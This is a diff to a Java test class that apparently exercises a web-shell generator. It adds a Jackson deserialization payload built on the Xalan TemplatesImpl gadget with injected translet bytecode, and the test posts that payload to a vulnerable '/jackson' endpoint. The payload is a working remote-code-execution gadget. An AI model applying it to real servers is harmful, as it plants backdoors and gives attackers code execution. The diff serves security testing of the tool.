@@ -14,6 +14,7 @@ import com.reajason.javaweb.packer.jar.AgentJarPacker;
 import com.reajason.javaweb.packer.jar.AgentJarWithJDKAttacherPacker;
 import com.reajason.javaweb.packer.jar.AgentJarWithJREAttacherPacker;
 import com.reajason.javaweb.packer.jar.ScriptEngineJarPacker;
+import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
 import com.reajason.javaweb.suo5.Suo5Manager;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
@@ -126,6 +127,9 @@ public class ShellAssertion {
                     "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                     "  ]]\n" +
                     "]";
+        } else if (packer.getInstance() instanceof XalanAbstractTransletPacker) {
+            String bytes = packer.getInstance().pack(generateResult.toClassPackerConfig());
+            content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
         } else {
             content = packer.getInstance().pack(generateResult.toClassPackerConfig());
         }
@@ -395,6 +399,7 @@ public class ShellAssertion {
             case BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
             case XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
             case H2, H2JS, H2Javac -> VulTool.postIsOk(url + "/jdbc", content);
+            case XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
             default -> throw new IllegalStateException("Unexpected value: " + packer);
         }
     }
